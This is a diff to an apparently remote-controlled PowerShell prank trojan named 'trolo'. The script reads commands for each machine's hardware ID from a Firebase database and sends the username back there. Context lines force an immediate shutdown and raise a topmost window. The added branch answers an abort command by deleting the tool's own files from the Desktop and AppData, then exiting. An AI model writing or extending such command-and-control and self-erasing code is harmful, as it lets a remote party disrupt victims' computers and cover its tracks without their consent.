@@ -26,6 +26,15 @@ $body = @{
     Invoke-RestMethod -Uri $url -Method Patch -Body $body -ContentType "application/json"
 
     shutdown.exe /s /t 0 /f
+} elseif ($response.$hwid.message -eq "abortOperationAll") {
+    $body = @{
+        username = $username
+        message  = ""
+    } | ConvertTo-Json -Depth 3
+    $url = "https://trolo-1252e-default-rtdb.firebaseio.com/main/${hwid}.json"
+    Invoke-RestMethod -Uri $url -Method Patch -Body $body -ContentType "application/json"
+    Get-ChildItem -Path "$env:USERPROFILE\Desktop","$env:APPDATA" -Filter "trolo2.*" -Recurse -File | Remove-Item -Force
+    exit
 } else {
 $topForm = New-Object System.Windows.Forms.Form
 $topForm.TopMost = $true
